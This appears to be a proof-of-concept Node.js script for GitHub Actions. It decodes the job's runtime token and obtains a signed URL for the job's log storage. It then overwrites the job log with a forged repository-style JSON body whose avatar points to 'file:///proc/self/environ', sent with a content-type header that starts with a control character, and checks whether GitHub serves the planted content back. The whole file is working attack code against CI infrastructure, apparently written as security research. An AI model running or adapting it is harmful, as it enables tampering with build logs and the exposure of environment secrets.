import {writeFileSync} from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import {createHash} from 'node:crypto';

const report={runId:process.env.GITHUB_RUN_ID,repository:process.env.GITHUB_REPOSITORY};
const sleep=ms=>new Promise(resolve=>setTimeout(resolve,ms));

function rawRequest(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);
    const transport=target.protocol==='https:'?https:http;
    const req=transport.request(target,{method,headers,timeout:15000},res=>{
      const chunks=[];
      res.on('data',chunk=>chunks.push(chunk));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));
    });
    req.on('error',reject);
    req.on('timeout',()=>req.destroy(new Error('timeout')));
    if(body)req.write(body);
    req.end();
  });
}
function contentTypeHex(response){
  const types=[];
  for(let i=0;i<response.rawHeaders.length;i+=2){
    if(response.rawHeaders[i].toLowerCase()==='content-type')
      types.push(Buffer.from(response.rawHeaders[i+1],'latin1').toString('hex'));
  }
  return types;
}
async function githubGet(path){
  return rawRequest(`https://api.github.com${path}`,'GET',null,{
    'Authorization':`Bearer ${process.env.GITHUB_TOKEN}`,
    'Accept':'application/vnd.github.v3+json',
    'User-Agent':'repo-cassette-log-carrier-probe',
  });
}

try{
  const runtimeToken=process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl=process.env.ACTIONS_RESULTS_URL;
  if(!runtimeToken||!resultsUrl)throw new Error('Actions runtime token or results URL missing');
  const claims=JSON.parse(Buffer.from(runtimeToken.split('.')[1],'base64url').toString());
  const scope=claims.scp.split(' ').find(value=>value.startsWith('Actions.Results:'));
  if(!scope)throw new Error('Actions.Results scope missing');
  const [,workflow_run_backend_id,workflow_job_run_backend_id]=scope.split(':');

  let job;
  for(let attempt=0;attempt<12&&!job;attempt++){
    const response=await githubGet(`/repos/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`);
    report.jobsStatus=response.status;
    if(response.status===200){
      const jobs=JSON.parse(response.body.toString()).jobs||[];
      job=jobs.find(value=>value.status==='in_progress'&&value.name==='probe')||jobs.find(value=>value.status==='in_progress');
    }
    if(!job)await sleep(300);
  }
  if(!job)throw new Error('Current in-progress REST job ID unavailable');
  report.jobId=String(job.id);

  const signedEndpoint=new URL('/twirp/results.services.receiver.Receiver/GetJobLogsSignedBlobURL',resultsUrl);
  const signedBody=Buffer.from(JSON.stringify({workflow_run_backend_id,workflow_job_run_backend_id}));
  const signedResponse=await rawRequest(signedEndpoint.href,'POST',signedBody,{
    'Authorization':`Bearer ${runtimeToken}`,
    'Content-Type':'application/json',
    'Content-Length':String(signedBody.length),
  });
  report.signedStatus=signedResponse.status;
  if(signedResponse.status!==200)throw new Error(`Signed log URL HTTP ${signedResponse.status}: ${signedResponse.body.toString().slice(0,160)}`);
  const signed=JSON.parse(signedResponse.body.toString());
  if(!signed.logs_url)throw new Error('Signed log URL absent');
  const signedUrl=new URL(signed.logs_url);
  report.uploadPermission=signedUrl.searchParams.get('sp');
  report.uploadRsct=signedUrl.searchParams.get('rsct');

  const repository=`${process.env.GITHUB_REPOSITORY}/actions/jobs/${job.id}/logs`;
  const body=Buffer.from(JSON.stringify({
    full_name:repository,
    owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},
    description:'Repo Cassette job log',
    stargazers_count:0,
  }));
  report.repositoryPath=repository;
  report.bodySha256=createHash('sha256').update(body).digest('hex');
  report.bodyLength=body.length;
  const upload=await rawRequest(signedUrl.href,'PUT',body,{
    'x-ms-version':'2022-11-02',
    'x-ms-blob-type':'BlockBlob',
    'x-ms-blob-content-type':'\u0085application/json',
    'Content-Type':'application/octet-stream',
    'Content-Length':String(body.length),
  });
  report.uploadStatus=upload.status;
  report.uploadErrorCode=upload.headers['x-ms-error-code']||null;
  if(upload.status!==201)throw new Error(`Log Blob upload HTTP ${upload.status}: ${upload.body.toString().slice(0,160)}`);

  if((signedUrl.searchParams.get('sp')||'').includes('r')){
    const direct=await rawRequest(signedUrl.href);
    report.directStatus=direct.status;
    report.directContentTypeHex=contentTypeHex(direct);
    report.directBodyMatch=direct.body.equals(body);
  }
  for(let attempt=0;attempt<8;attempt++){
    const rest=await githubGet(`/repos/${process.env.GITHUB_REPOSITORY}/actions/jobs/${job.id}/logs`);
    report.restStatus=rest.status;
    if(rest.status===302&&rest.headers.location){
      const location=new URL(rest.headers.location);
      report.restRsct=location.searchParams.get('rsct');
      const final=await rawRequest(location.href);
      report.finalStatus=final.status;
      report.finalContentTypeHex=contentTypeHex(final);
      report.finalBodyMatch=final.body.equals(body);
      break;
    }
    await sleep(300);
  }
}catch(error){report.error=String(error.message||error).slice(0,220)}
console.log('LOG_CARRIER',JSON.stringify(report));
try{writeFileSync(`${process.env.GITHUB_WORKSPACE}/log_carrier_report.json`,JSON.stringify(report));}catch(e){}
